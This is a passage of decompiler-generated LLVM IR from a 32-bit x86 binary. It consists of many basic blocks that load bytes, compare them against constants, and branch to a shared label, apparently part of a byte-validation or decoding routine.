dec_label_pc_804ec59:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ec49
  %v0_804ec59 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ec59 = trunc i32 %v0_804ec59 to i8
  %v4_804ec59 = icmp eq i8 %v3_804ec59, 0
  br i1 %v4_804ec59, label %dec_label_pc_804ec66, label %dec_label_pc_804ec5d

dec_label_pc_804ec5d:                             ; preds = %dec_label_pc_804ec59
  %v0_804ec5d = load i32, i32* @ebx, align 4
  %v1_804ec5d = trunc i32 %v0_804ec5d to i8
  %notlhs482 = icmp eq i8 %v1_804ec5d, 11
  %tmp719 = and i8 %v4_804e2e1, -4
  %tmp720 = icmp eq i8 %tmp719, -112
  %tmp721 = and i1 %tmp720, %notlhs482
  br i1 %tmp721, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec66

dec_label_pc_804ec66:                             ; preds = %dec_label_pc_804ec5d, %dec_label_pc_804ec59
  %v1_804ec66 = add i32 %v0_80506d0, 75
  %v2_804ec66 = inttoptr i32 %v1_804ec66 to i8*
  %v3_804ec66 = load i8, i8* %v2_804ec66, align 1
  %v4_804ec66 = icmp eq i8 %v3_804ec66, 0
  br i1 %v4_804ec66, label %dec_label_pc_804ec7f, label %dec_label_pc_804ec6d

dec_label_pc_804ec6d:                             ; preds = %dec_label_pc_804ec66
  br i1 %v4_804ec59, label %dec_label_pc_804ec98, label %dec_label_pc_804ec71

dec_label_pc_804ec71:                             ; preds = %dec_label_pc_804ec6d
  %tmp722 = icmp ugt i8 %v4_804e2e1, 20
  %v4_804e2e1.off = add i8 %v4_804e2e1, -21
  %tmp723 = icmp ult i8 %v4_804e2e1.off, 2
  %or.cond222 = and i1 %tmp722, %tmp723
  br i1 %or.cond222, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec83

dec_label_pc_804ec7f:                             ; preds = %dec_label_pc_804ec66
  br i1 %v4_804ec59, label %dec_label_pc_804ec98, label %dec_label_pc_804ec83

dec_label_pc_804ec83:                             ; preds = %dec_label_pc_804ec71, %dec_label_pc_804ec7f
  %v1_804ec83 = add i32 %v0_80506d0, 45
  %v2_804ec83 = inttoptr i32 %v1_804ec83 to i8*
  %v3_804ec83 = load i8, i8* %v2_804ec83, align 1
  %notlhs485 = icmp ne i8 %v3_804ec83, 0
  %v4_804e2e1.off487 = add i8 %v4_804e2e1, 120
  %tmp724 = icmp ult i8 %v4_804e2e1.off487, 3
  %tmp725 = and i1 %tmp724, %notlhs485
  br i1 %tmp725, label %dec_label_pc_804e2d1, label %dec_label_pc_804ec98

dec_label_pc_804ec98:                             ; preds = %dec_label_pc_804ec83, %dec_label_pc_804ec7f, %dec_label_pc_804ec6d
  %v1_804ec98 = add i32 %v0_80506d0, 53
  %v2_804ec98 = inttoptr i32 %v1_804ec98 to i8*
  %v3_804ec98 = load i8, i8* %v2_804ec98, align 1
  %v4_804ec98 = icmp eq i8 %v3_804ec98, 0
  %brmerge = or i1 %v4_804ec59, %v4_804ec98
  %tmp726 = icmp ult i8 %v4_804e2e1, -69
  %or.cond225 = or i1 %tmp726, %brmerge
  %or.cond225.not = xor i1 %or.cond225, true
  %or.cond226 = and i1 %tmp697, %or.cond225.not
  br i1 %or.cond226, label %dec_label_pc_804e2d1, label %dec_label_pc_804ecb1

dec_label_pc_804ecb1:                             ; preds = %dec_label_pc_804ec98
  %v1_804ecb1 = add i32 %v0_80506d0, 46
  %v2_804ecb1 = inttoptr i32 %v1_804ecb1 to i8*
  %v3_804ecb1 = load i8, i8* %v2_804ecb1, align 1
  %v4_804ecb1 = icmp eq i8 %v3_804ecb1, 0
  br i1 %v4_804ecb1, label %dec_label_pc_804ecd1, label %dec_label_pc_804ecb8

dec_label_pc_804ecb8:                             ; preds = %dec_label_pc_804ecb1
  %v0_804ecb8 = load i32, i32* @ebx, align 4
  %v1_804ecb8 = trunc i32 %v0_804ecb8 to i8
  %notlhs488 = icmp eq i8 %v1_804ecb8, -106
  %v4_804e2e1.off490 = add i8 %v4_804e2e1, -120
  %tmp727 = icmp ult i8 %v4_804e2e1.off490, 95
  %tmp728 = and i1 %tmp727, %notlhs488
  br i1 %tmp728, label %dec_label_pc_804e2d1, label %dec_label_pc_804ecc1

dec_label_pc_804ecc1:                             ; preds = %dec_label_pc_804ecb8
  %notlhs491 = icmp eq i8 %v1_804ecb8, -105
  %notrhs492 = icmp ugt i8 %v4_804e2e1, -120
  %or.cond352.not = and i1 %notrhs492, %notlhs491
  %v4_804e2e1.off167 = add i8 %v4_804e2e1, 119
  %tmp729 = icmp ult i8 %v4_804e2e1.off167, 2
  %or.cond355 = and i1 %tmp729, %or.cond352.not
  br i1 %or.cond355, label %dec_label_pc_804e2d1, label %dec_label_pc_804ecd1

dec_label_pc_804ecd1:                             ; preds = %dec_label_pc_804ecc1, %dec_label_pc_804ecb1
  %v1_804ecd1 = add i32 %v0_80506d0, 72
  %v2_804ecd1 = inttoptr i32 %v1_804ecd1 to i8*
  %v3_804ecd1 = load i8, i8* %v2_804ecd1, align 1
  %v4_804ecd1 = icmp eq i8 %v3_804ecd1, 0
  br i1 %v4_804ecd1, label %dec_label_pc_804ece1, label %dec_label_pc_804ecd8

dec_label_pc_804ecd8:                             ; preds = %dec_label_pc_804ecd1
  %v0_804ecd8 = load i32, i32* @ebx, align 4
  %v1_804ecd8 = trunc i32 %v0_804ecd8 to i8
  %notlhs493 = icmp eq i8 %v1_804ecd8, 94
  %notrhs494 = icmp ugt i8 %v4_804e2e1, -20
  %or.cond334.not = and i1 %notrhs494, %notlhs493
  %v12_8050694 = icmp eq i8 %v4_804e2e1, -1
  %v1_8050697 = icmp eq i1 %v12_8050694, false
  %or.cond336 = and i1 %v1_8050697, %or.cond334.not
  br i1 %or.cond336, label %dec_label_pc_804e2d1, label %dec_label_pc_804ece1

dec_label_pc_804ece1:                             ; preds = %dec_label_pc_804ecd8, %dec_label_pc_804ecd1
  switch i8 %v1_804ec40, label %dec_label_pc_804ecf3 [
    i8 63, label %dec_label_pc_805066b
    i8 70, label %dec_label_pc_8050863
  ]

dec_label_pc_804ecf3.thread:                      ; preds = %dec_label_pc_8050863, %dec_label_pc_805066b
  %v0_804ed13.pre.ph = phi i32 [ %v0_805066b, %dec_label_pc_805066b ], [ %v0_8050863, %dec_label_pc_8050863 ]
  %v3_804ecf6634 = and i32 %v0_804ec59, -256
  store i32 %v3_804ecf6634, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge

dec_label_pc_804ecf3:                             ; preds = %dec_label_pc_804ece1
  %v0_804ed13.pre.pre = load i32, i32* @ebx, align 4
  %v10_804ecf3 = icmp eq i8 %v1_804ec40, 74
  %v1_804ecf6 = zext i1 %v10_804ecf3 to i32
  %v3_804ecf6 = and i32 %v0_804ec59, -256
  %v4_804ecf6 = or i32 %v3_804ecf6, %v1_804ecf6
  store i32 %v4_804ecf6, i32* %eax.global-to-local, align 4
  %v4_804ecf9 = icmp eq i1 %v10_804ecf3, false
  br i1 %v4_804ecf9, label %dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge, label %dec_label_pc_804ecfd

dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge: ; preds = %dec_label_pc_804ecf3.thread, %dec_label_pc_804ecf3
  %v0_804ed13.pre637 = phi i32 [ %v0_804ed13.pre.ph, %dec_label_pc_804ecf3.thread ], [ %v0_804ed13.pre.pre, %dec_label_pc_804ecf3 ]
  %.pre631 = trunc i32 %v0_804ed13.pre637 to i8
  br label %dec_label_pc_804ed13

dec_label_pc_804ecfd:                             ; preds = %dec_label_pc_804ecf3
  %v1_804ecfd = trunc i32 %v0_804ed13.pre.pre to i8
  switch i8 %v1_804ecfd, label %dec_label_pc_804ed13 [
    i8 91, label %dec_label_pc_80506b9
    i8 -55, label %dec_label_pc_80506a2
  ]

dec_label_pc_804ed13:                             ; preds = %dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge, %dec_label_pc_80506b9, %dec_label_pc_80506a2, %dec_label_pc_804ecfd
  %v1_804ed13.pre-phi = phi i8 [ %.pre631, %dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge ], [ 91, %dec_label_pc_80506b9 ], [ -55, %dec_label_pc_80506a2 ], [ %v1_804ecfd, %dec_label_pc_804ecfd ]
  %v11_804ed13 = icmp eq i8 %v1_804ed13.pre-phi, -47
  %v1_804ed16 = zext i1 %v11_804ed13 to i8
  %v3_804ed16 = add i32 %v0_80506d0, 44
  %v4_804ed16 = inttoptr i32 %v3_804ed16 to i8*
  store i8 %v1_804ed16, i8* %v4_804ed16, align 1
  %v0_804ed1b = load i32, i32* @esp, align 4
  %v1_804ed1b = add i32 %v0_804ed1b, 56
  %v2_804ed1b = inttoptr i32 %v1_804ed1b to i8*
  %v3_804ed1b = load i8, i8* %v2_804ed1b, align 1
  %v4_804ed1b = icmp eq i8 %v3_804ed1b, 0
  br i1 %v4_804ed1b, label %dec_label_pc_804ed47, label %dec_label_pc_804ed22

dec_label_pc_804ed22:                             ; preds = %dec_label_pc_804ed13
  %v1_804ed22 = add i32 %v0_804ed1b, 44
  %v2_804ed22 = inttoptr i32 %v1_804ed22 to i8*
  %v3_804ed22 = load i8, i8* %v2_804ed22, align 1
  %notlhs497 = icmp ne i8 %v3_804ed22, 0
  %v4_804e2e1.off499 = add i8 %v4_804e2e1, -48
  %tmp730 = icmp ult i8 %v4_804e2e1.off499, 5
  %tmp731 = and i1 %tmp730, %notlhs497
  br i1 %tmp731, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed3e

dec_label_pc_804ed3e:                             ; preds = %dec_label_pc_804ed22
  %v0_804ed3e = load i32, i32* @ebx, align 4
  %v1_804ed3e = trunc i32 %v0_804ed3e to i8
  %v11_804ed3e = icmp eq i8 %v1_804ed3e, -91
  br i1 %v11_804ed3e, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed47

dec_label_pc_804ed47:                             ; preds = %dec_label_pc_804ed3e, %dec_label_pc_804ed13
  %v1_804ed47 = add i32 %v0_804ed1b, 87
  %v2_804ed47 = inttoptr i32 %v1_804ed47 to i8*
  %v3_804ed47 = load i8, i8* %v2_804ed47, align 1
  %v4_804ed47 = icmp eq i8 %v3_804ed47, 0
  br i1 %v4_804ed47, label %dec_label_pc_804ed57, label %dec_label_pc_804ed4e

dec_label_pc_804ed4e:                             ; preds = %dec_label_pc_804ed47
  %v0_804ed4e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ed4e = trunc i32 %v0_804ed4e to i8
  %v11_804ed4e = icmp eq i8 %v1_804ed4e, -107
  br i1 %v11_804ed4e, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed57

dec_label_pc_804ed57:                             ; preds = %dec_label_pc_804ed4e, %dec_label_pc_804ed47
  %v1_804ed57 = add i32 %v0_804ed1b, 97
  %v2_804ed57 = inttoptr i32 %v1_804ed57 to i8*
  %v3_804ed57 = load i8, i8* %v2_804ed57, align 1
  %v4_804ed57 = icmp eq i8 %v3_804ed57, 0
  br i1 %v4_804ed57, label %dec_label_pc_804ed67, label %dec_label_pc_804ed5e

dec_label_pc_804ed5e:                             ; preds = %dec_label_pc_804ed57
  %v0_804ed5e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ed5e = trunc i32 %v0_804ed5e to i8
  %v11_804ed5e = icmp eq i8 %v1_804ed5e, -105
  br i1 %v11_804ed5e, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed67

dec_label_pc_804ed67:                             ; preds = %dec_label_pc_804ed5e, %dec_label_pc_804ed57
  %v1_804ed67 = add i32 %v0_804ed1b, 83
  %v2_804ed67 = inttoptr i32 %v1_804ed67 to i8*
  %v3_804ed67 = load i8, i8* %v2_804ed67, align 1
  %v4_804ed67 = icmp eq i8 %v3_804ed67, 0
  br i1 %v4_804ed67, label %dec_label_pc_804ed77, label %dec_label_pc_804ed6e

dec_label_pc_804ed6e:                             ; preds = %dec_label_pc_804ed67
  %v0_804ed6e = load i32, i32* @ebx, align 4
  %v1_804ed6e = trunc i32 %v0_804ed6e to i8
  %v11_804ed6e = icmp eq i8 %v1_804ed6e, -124
  br i1 %v11_804ed6e, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed77

dec_label_pc_804ed77:                             ; preds = %dec_label_pc_804ed6e, %dec_label_pc_804ed67
  %v0_804ed77 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ed77 = trunc i32 %v0_804ed77 to i8
  %v8_804ed77 = icmp eq i8 %v1_804ed77, -80
  br i1 %v8_804ed77, label %dec_label_pc_8050855, label %dec_label_pc_804ed80

dec_label_pc_804ed80:                             ; preds = %dec_label_pc_8050855, %dec_label_pc_804ed77
  %v1_804ed80 = add i32 %v0_804ed1b, 93
  %v2_804ed80 = inttoptr i32 %v1_804ed80 to i8*
  %v3_804ed80 = load i8, i8* %v2_804ed80, align 1
  %v4_804ed80 = icmp eq i8 %v3_804ed80, 0
  br i1 %v4_804ed80, label %dec_label_pc_804ed92, label %dec_label_pc_804ed87

dec_label_pc_804ed87:                             ; preds = %dec_label_pc_804ed80
  %v1_804ed87 = add i32 %v0_804ed1b, 82
  %v2_804ed87 = inttoptr i32 %v1_804ed87 to i8*
  %v3_804ed87 = load i8, i8* %v2_804ed87, align 1
  %v4_804ed87 = icmp eq i8 %v3_804ed87, 0
  %v1_804ed8c = icmp eq i1 %v4_804ed87, false
  br i1 %v1_804ed8c, label %dec_label_pc_804e2d1, label %dec_label_pc_804ed92

dec_label_pc_804ed92:                             ; preds = %dec_label_pc_804ed87, %dec_label_pc_804ed80
  %v1_804ed92 = add i32 %v0_804ed1b, 85
  %v2_804ed92 = inttoptr i32 %v1_804ed92 to i8*
  %v3_804ed92 = load i8, i8* %v2_804ed92, align 1
  %v4_804ed92 = icmp eq i8 %v3_804ed92, 0
  %v1_805083c = add i32 %v0_804ed1b, 54
  %v2_805083c = inttoptr i32 %v1_805083c to i8*
  %v3_805083c = load i8, i8* %v2_805083c, align 1
  %v4_805083c = icmp eq i8 %v3_805083c, 0
  br i1 %v4_804ed92, label %dec_label_pc_805083c, label %dec_label_pc_804ed9d

dec_label_pc_804ed9d:                             ; preds = %dec_label_pc_804ed92
  %v1_804eda2 = icmp eq i1 %v4_805083c, false
  br i1 %v1_804eda2, label %dec_label_pc_804e2d1, label %dec_label_pc_804eda8

dec_label_pc_804eda8:                             ; preds = %dec_label_pc_8050847, %dec_label_pc_805083c, %dec_label_pc_804ed9d
  %v1_804eda8 = add i32 %v0_804ed1b, 79
  %v2_804eda8 = inttoptr i32 %v1_804eda8 to i8*
  %v3_804eda8 = load i8, i8* %v2_804eda8, align 1
  %v4_804eda8 = icmp eq i8 %v3_804eda8, 0
  %v1_8050823 = add i32 %v0_804ed1b, 49
  %v2_8050823 = inttoptr i32 %v1_8050823 to i8*
  %v3_8050823 = load i8, i8* %v2_8050823, align 1
  %v4_8050823 = icmp eq i8 %v3_8050823, 0
  br i1 %v4_804eda8, label %dec_label_pc_8050823, label %dec_label_pc_804edb3

dec_label_pc_804edb3:                             ; preds = %dec_label_pc_804eda8
  %v1_804edb8 = icmp eq i1 %v4_8050823, false
  br i1 %v1_804edb8, label %dec_label_pc_804e2d1, label %dec_label_pc_804edbe

dec_label_pc_804edbe:                             ; preds = %dec_label_pc_805082e, %dec_label_pc_8050823, %dec_label_pc_804edb3
  %v10_804edbe = icmp eq i8 %v1_804ed77, 46
  br i1 %v10_804edbe, label %dec_label_pc_8050815, label %dec_label_pc_804edc7

dec_label_pc_804edc7:                             ; preds = %dec_label_pc_8050815, %dec_label_pc_804edbe
  %v10_804edc7 = icmp eq i8 %v1_804ed77, 51
  %v1_804edca = zext i1 %v10_804edc7 to i8
  %v3_804edca = add i32 %v0_804ed1b, 43
  %v4_804edca = inttoptr i32 %v3_804edca to i8*
  store i8 %v1_804edca, i8* %v4_804edca, align 1
  %v0_804edcf = load i32, i32* @esp, align 4
  %v1_804edcf = add i32 %v0_804edcf, 67
  %v2_804edcf = inttoptr i32 %v1_804edcf to i8*
  %v3_804edcf = load i8, i8* %v2_804edcf, align 1
  %v4_804edcf = icmp eq i8 %v3_804edcf, 0
  %v1_80507fc = add i32 %v0_804edcf, 43
  %v2_80507fc = inttoptr i32 %v1_80507fc to i8*
  %v3_80507fc = load i8, i8* %v2_80507fc, align 1
  %v4_80507fc = icmp eq i8 %v3_80507fc, 0
  br i1 %v4_804edcf, label %dec_label_pc_80507fc, label %dec_label_pc_804edda

dec_label_pc_804edda:                             ; preds = %dec_label_pc_804edc7
  %v1_804eddf = icmp eq i1 %v4_80507fc, false
  br i1 %v1_804eddf, label %dec_label_pc_804e2d1, label %dec_label_pc_804ede5

dec_label_pc_804ede5:                             ; preds = %dec_label_pc_8050807, %dec_label_pc_80507fc, %dec_label_pc_804edda
  %v0_804ede5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ede5 = trunc i32 %v0_804ede5 to i8
  %v10_804ede5 = icmp eq i8 %v1_804ede5, 5
  %v1_804ede8 = zext i1 %v10_804ede5 to i32
  %v2_804ede8 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ede8 = and i32 %v2_804ede8, -256
  %v4_804ede8 = or i32 %v1_804ede8, %v3_804ede8
  store i32 %v4_804ede8, i32* %eax.global-to-local, align 4
  %v4_804edeb = icmp eq i1 %v10_804ede5, false
  br i1 %v4_804edeb, label %dec_label_pc_804edf8, label %dec_label_pc_804edef

dec_label_pc_804edef:                             ; preds = %dec_label_pc_804ede5
  %v0_804edef = load i32, i32* @ebx, align 4
  %v1_804edef = trunc i32 %v0_804edef to i8
  %v11_804edef = icmp eq i8 %v1_804edef, -121
  br i1 %v11_804edef, label %dec_label_pc_804e2d1, label %dec_label_pc_804edf8

dec_label_pc_804edf8:                             ; preds = %dec_label_pc_804edef, %dec_label_pc_804ede5
  %v1_804edf8 = add i32 %v0_804edcf, 91
  %v2_804edf8 = inttoptr i32 %v1_804edf8 to i8*
  %v3_804edf8 = load i8, i8* %v2_804edf8, align 1
  %v4_804edf8 = icmp eq i8 %v3_804edf8, 0
  br i1 %v4_804edf8, label %dec_label_pc_80507d0, label %dec_label_pc_804ee03

dec_label_pc_804ee03:                             ; preds = %dec_label_pc_804edf8
  %v1_804ee05 = icmp eq i1 %v4_804edeb, false
  br i1 %v1_804ee05, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee0b

dec_label_pc_804ee0b:                             ; preds = %dec_label_pc_80507d8, %dec_label_pc_80507d0, %dec_label_pc_804ee03
  %v10_804ee0b = icmp eq i8 %v1_804ede5, 91
  br i1 %v10_804ee0b, label %dec_label_pc_80508b1, label %dec_label_pc_804ee14

dec_label_pc_804ee14:                             ; preds = %dec_label_pc_80508b1, %dec_label_pc_804ee0b
  %v1_804ee14 = add i32 %v0_804edcf, 57
  %v2_804ee14 = inttoptr i32 %v1_804ee14 to i8*
  %v3_804ee14 = load i8, i8* %v2_804ee14, align 1
  %v4_804ee14 = icmp eq i8 %v3_804ee14, 0
  br i1 %v4_804ee14, label %dec_label_pc_804ee24, label %dec_label_pc_804ee1b

dec_label_pc_804ee1b:                             ; preds = %dec_label_pc_804ee14
  %v0_804ee1b = load i32, i32* @ebx, align 4
  %v1_804ee1b = trunc i32 %v0_804ee1b to i8
  %v11_804ee1b = icmp ne i8 %v1_804ee1b, -56
  %or.cond389 = or i1 %v1_8050585, %v11_804ee1b
  %or.cond389.not = xor i1 %or.cond389, true
  %tmp732 = icmp ult i8 %v4_804e2e1, -97
  %or.cond391 = and i1 %tmp732, %or.cond389.not
  br i1 %or.cond391, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee24

dec_label_pc_804ee24:                             ; preds = %dec_label_pc_804ee1b, %dec_label_pc_804ee14
  %v1_804ee24 = add i32 %v0_804edcf, 52
  %v2_804ee24 = inttoptr i32 %v1_804ee24 to i8*
  %v3_804ee24 = load i8, i8* %v2_804ee24, align 1
  %v4_804ee24 = icmp eq i8 %v3_804ee24, 0
  br i1 %v4_804ee24, label %dec_label_pc_804ee44, label %dec_label_pc_804ee2b

dec_label_pc_804ee2b:                             ; preds = %dec_label_pc_804ee24
  %v0_804ee2b = load i32, i32* @ebx, align 4
  %v1_804ee2b = trunc i32 %v0_804ee2b to i8
  %notlhs500 = icmp eq i8 %v1_804ee2b, -104
  %v4_804e2e1.off502 = add i8 %v4_804e2e1, -96
  %tmp733 = icmp ult i8 %v4_804e2e1.off502, 15
  %tmp734 = and i1 %tmp733, %notlhs500
  br i1 %tmp734, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee34

dec_label_pc_804ee34:                             ; preds = %dec_label_pc_804ee2b
  %notlhs503 = icmp eq i8 %v1_804ee2b, -75
  %v4_804e2e1.off505 = add i8 %v4_804e2e1, 96
  %tmp735 = icmp ult i8 %v4_804e2e1.off505, 29
  %tmp736 = and i1 %tmp735, %notlhs503
  br i1 %tmp736, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee44

dec_label_pc_804ee44:                             ; preds = %dec_label_pc_804ee34, %dec_label_pc_804ee24
  %v1_804ee44 = add i32 %v0_804edcf, 96
  %v2_804ee44 = inttoptr i32 %v1_804ee44 to i8*
  %v3_804ee44 = load i8, i8* %v2_804ee44, align 1
  %v4_804ee44 = icmp eq i8 %v3_804ee44, 0
  br i1 %v4_804ee44, label %dec_label_pc_804ee60, label %dec_label_pc_804ee4b

dec_label_pc_804ee4b:                             ; preds = %dec_label_pc_804ee44
  %v1_804ee4b = add i32 %v0_804edcf, 71
  %v2_804ee4b = inttoptr i32 %v1_804ee4b to i8*
  %v3_804ee4b = load i8, i8* %v2_804ee4b, align 1
  %notlhs506 = icmp ne i8 %v3_804ee4b, 0
  %v4_804e2e1.off508 = add i8 %v4_804e2e1, -64
  %tmp737 = icmp ult i8 %v4_804e2e1.off508, 31
  %tmp738 = and i1 %tmp737, %notlhs506
  br i1 %tmp738, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee60

dec_label_pc_804ee60:                             ; preds = %dec_label_pc_804ee4b, %dec_label_pc_804ee44
  %v1_804ee60 = add i32 %v0_804edcf, 51
  %v2_804ee60 = inttoptr i32 %v1_804ee60 to i8*
  %v3_804ee60 = load i8, i8* %v2_804ee60, align 1
  %notlhs509 = icmp eq i8 %v3_804ee60, 0
  %notrhs510 = icmp ne i8 %v1_804ede5, -72
  %or.cond233.not = or i1 %notrhs510, %notlhs509
  %tmp739 = icmp ult i8 %v4_804e2e1, -16
  %or.cond406 = or i1 %tmp739, %or.cond233.not
  %or.cond406.not = xor i1 %or.cond406, true
  %v12_80508c8 = icmp eq i8 %v4_804e2e1, -1
  %v1_80508cb = icmp eq i1 %v12_80508c8, false
  %or.cond408 = and i1 %v1_80508cb, %or.cond406.not
  br i1 %or.cond408, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee70

dec_label_pc_804ee70:                             ; preds = %dec_label_pc_804ee60
  %v1_804ee70 = add i32 %v0_804edcf, 99
  %v2_804ee70 = inttoptr i32 %v1_804ee70 to i8*
  %v3_804ee70 = load i8, i8* %v2_804ee70, align 1
  %v4_804ee70 = icmp eq i8 %v3_804ee70, 0
  br i1 %v4_804ee70, label %dec_label_pc_804eea0, label %dec_label_pc_804ee77

dec_label_pc_804ee77:                             ; preds = %dec_label_pc_804ee70
  %v0_804ee77 = load i32, i32* @ebx, align 4
  %v1_804ee77 = trunc i32 %v0_804ee77 to i8
  %v10_804ee77 = icmp ne i8 %v1_804ee77, 111
  %or.cond414 = or i1 %v1_8050585, %v10_804ee77
  %or.cond414.not = xor i1 %or.cond414, true
  %tmp740 = icmp ult i8 %v4_804e2e1, -113
  %or.cond416 = and i1 %tmp740, %or.cond414.not
  br i1 %or.cond416, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee87

dec_label_pc_804ee87:                             ; preds = %dec_label_pc_804ee77
  %notlhs511 = icmp eq i8 %v1_804ee77, -4
  %v4_804e2e1.off513 = add i8 %v4_804e2e1, 48
  %tmp741 = icmp ult i8 %v4_804e2e1.off513, 15
  %tmp742 = and i1 %tmp741, %notlhs511
  br i1 %tmp742, label %dec_label_pc_804e2d1, label %dec_label_pc_804ee90

dec_label_pc_804ee90:                             ; preds = %dec_label_pc_804ee87
  %notlhs514 = icmp eq i8 %v1_804ee77, 40
  %v4_804e2e1.off516 = add i8 %v4_804e2e1, -56
  %tmp743 = icmp ult i8 %v4_804e2e1.off516, 3
  %tmp744 = and i1 %tmp743, %notlhs514
  br i1 %tmp744, label %dec_label_pc_804e2d1, label %dec_label_pc_804eea0

dec_label_pc_804eea0:                             ; preds = %dec_label_pc_804ee90, %dec_label_pc_804ee70
  %v1_804eea0 = add i32 %v0_804edcf, 66
  %v2_804eea0 = inttoptr i32 %v1_804eea0 to i8*
  %v3_804eea0 = load i8, i8* %v2_804eea0, align 1
  %v4_804eea0 = icmp eq i8 %v3_804eea0, 0
  br i1 %v4_804eea0, label %dec_label_pc_804eeb0, label %dec_label_pc_804eea7

dec_label_pc_804eea7:                             ; preds = %dec_label_pc_804eea0
  %v0_804eea7 = load i32, i32* @ebx, align 4
  %v1_804eea7 = trunc i32 %v0_804eea7 to i8
  %notlhs517 = icmp eq i8 %v1_804eea7, 8
  %v4_804e2e1.off519 = add i8 %v4_804e2e1, -81
  %tmp745 = icmp ult i8 %v4_804e2e1.off519, 14
  %tmp746 = and i1 %tmp745, %notlhs517
  br i1 %tmp746, label %dec_label_pc_804e2d1, label %dec_label_pc_804eeb0

dec_label_pc_804eeb0:                             ; preds = %dec_label_pc_804eea7, %dec_label_pc_804eea0
  %v1_804eeb0 = add i32 %v0_804edcf, 58
  %v2_804eeb0 = inttoptr i32 %v1_804eeb0 to i8*
  %v3_804eeb0 = load i8, i8* %v2_804eeb0, align 1
  %v4_804eeb0 = icmp eq i8 %v3_804eeb0, 0
  br i1 %v4_804eeb0, label %dec_label_pc_804eec0, label %dec_label_pc_804eeb7

dec_label_pc_804eeb7:                             ; preds = %dec_label_pc_804eeb0
  %v0_804eeb7 = load i32, i32* @ebx, align 4
  %v1_804eeb7 = trunc i32 %v0_804eeb7 to i8
  %notlhs520 = icmp eq i8 %v1_804eeb7, 116
  %v4_804e2e1.off522 = add i8 %v4_804e2e1, -112
  %tmp747 = icmp ult i8 %v4_804e2e1.off522, 7
  %tmp748 = and i1 %tmp747, %notlhs520
  br i1 %tmp748, label %dec_label_pc_804e2d1, label %dec_label_pc_804eec0

dec_label_pc_804eec0:                             ; preds = %dec_label_pc_804eeb7, %dec_label_pc_804eeb0
  %v1_804eec0 = add i32 %v0_804edcf, 89
  %v2_804eec0 = inttoptr i32 %v1_804eec0 to i8*
  %v3_804eec0 = load i8, i8* %v2_804eec0, align 1
  %v4_804eec0 = icmp eq i8 %v3_804eec0, 0
  br i1 %v4_804eec0, label %dec_label_pc_804eedc, label %dec_label_pc_804eec7

dec_label_pc_804eec7:                             ; preds = %dec_label_pc_804eec0
  br i1 %v4_804eeb0, label %dec_label_pc_804eefc, label %dec_label_pc_804eece

dec_label_pc_804eece:                             ; preds = %dec_label_pc_804eec7
  %tmp749 = icmp ugt i8 %v4_804e2e1, -9
  %or.cond235 = and i1 %tmp749, %v1_80508cb
  br i1 %or.cond235, label %dec_label_pc_804e2d1, label %dec_label_pc_804eee3

dec_label_pc_804eedc:                             ; preds = %dec_label_pc_804eec0
  br i1 %v4_804eeb0, label %dec_label_pc_804eefc, label %dec_label_pc_804eee3

dec_label_pc_804eee3:                             ; preds = %dec_label_pc_804eece, %dec_label_pc_804eedc
  %v0_804eee3 = load i32, i32* @ebx, align 4
  %v1_804eee3 = trunc i32 %v0_804eee3 to i8
  %notlhs523 = icmp eq i8 %v1_804eee3, 36
  %v4_804e2e1.off525 = add i8 %v4_804e2e1, 36
  %tmp750 = icmp ult i8 %v4_804e2e1.off525, 3
  %tmp751 = and i1 %tmp750, %notlhs523
  br i1 %tmp751, label %dec_label_pc_804e2d1, label %dec_label_pc_804eeec

dec_label_pc_804eeec:                             ; preds = %dec_label_pc_804eee3
  %notlhs526 = icmp eq i8 %v1_804eee3, 58
  %v4_804e2e1.off528 = add i8 %v4_804e2e1, 72
  %tmp752 = icmp ult i8 %v4_804e2e1.off528, 3
  %tmp753 = and i1 %tmp752, %notlhs526
  br i1 %tmp753, label %dec_label_pc_804e2d1, label %dec_label_pc_804eefc

dec_label_pc_804eefc:                             ; preds = %dec_label_pc_804eeec, %dec_label_pc_804eedc, %dec_label_pc_804eec7
  %v11_804eefc = icmp eq i8 %v1_804ede5, -50
  br i1 %v11_804eefc, label %dec_label_pc_805034c, label %dec_label_pc_804ef05

dec_label_pc_804ef05:                             ; preds = %dec_label_pc_805034c, %dec_label_pc_804eefc
  %v1_804ef05 = add i32 %v0_804edcf, 47
  %v2_804ef05 = inttoptr i32 %v1_804ef05 to i8*
  %v3_804ef05 = load i8, i8* %v2_804ef05, align 1
  %v4_804ef05 = icmp eq i8 %v3_804ef05, 0
  br i1 %v4_804ef05, label %dec_label_pc_804ef25, label %dec_label_pc_804ef0c

dec_label_pc_804ef0c:                             ; preds = %dec_label_pc_804ef05
  %v0_804ef0c = load i32, i32* @ebx, align 4
  %v1_804ef0c = trunc i32 %v0_804ef0c to i8
  %notlhs529 = icmp eq i8 %v1_804ef0c, 78
  %v4_804e2e1.off531 = add i8 %v4_804e2e1, -40
  %tmp754 = icmp ult i8 %v4_804e2e1.off531, 3
  %tmp755 = and i1 %tmp754, %notlhs529
  br i1 %tmp755, label %dec_label_pc_804e2d1, label %dec_label_pc_804ef15

dec_label_pc_804ef15:                             ; preds = %dec_label_pc_804ef0c
  %notlhs532 = icmp eq i8 %v1_804ef0c, 93
